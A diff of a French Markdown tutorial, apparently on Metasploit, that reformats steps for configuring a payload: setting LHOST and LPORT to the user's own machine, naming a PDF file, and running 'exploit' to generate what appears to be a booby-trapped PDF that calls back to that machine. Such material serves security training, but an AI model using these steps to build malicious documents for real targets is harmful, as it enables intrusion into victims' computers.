@@ -20,9 +20,9 @@ Pour voir les options actuelles du payload, tapez : ```show options```
 
 Vous devriez avoir quelque chose comme cela, peut être qu’une adresse par défaut ou qu’un port par défaut à été renseigné pour LHOST et LPORT.
 Nous allons configurer ce payload. Il faut commencer par renseigner les valeurs de LHOST et LPORT.
-Pour cela tapez set LHOST x.x.x.x en remplaçant les x par les valeurs de l’adresse ip de votre machine. Puis tapez set LPORT xxx en remplaçant xxx par le port de votre choix (par exemple, set LPORT 4444).
+Pour cela tapez ```set LHOST x.x.x.x``` en remplaçant les x par les valeurs de l’adresse ip de votre machine. Puis tapez ```set LPORT xxx``` en remplaçant xxx par le port de votre choix (par exemple, ```set LPORT 4444```).
 vous pouvez refaire un show options, vous devriez voir que les options ont été prises en compte.
-Vous pouvez ensuite modifier le nom de votre fichier pdf en tapant set FILENAME xxxx.pdf en remplaçant xxxx par le nom que vous voulez donner.
+Vous pouvez ensuite modifier le nom de votre fichier pdf en tapant ```set FILENAME xxxx.pdf``` en remplaçant xxxx par le nom que vous voulez donner.
 
 Quand tout est prêt, tapez exploit. Vous verrez ensuite que votre fichier a été créé et la console vous indique à la dernière ligne le chemin d’accès à ce fichier.
 
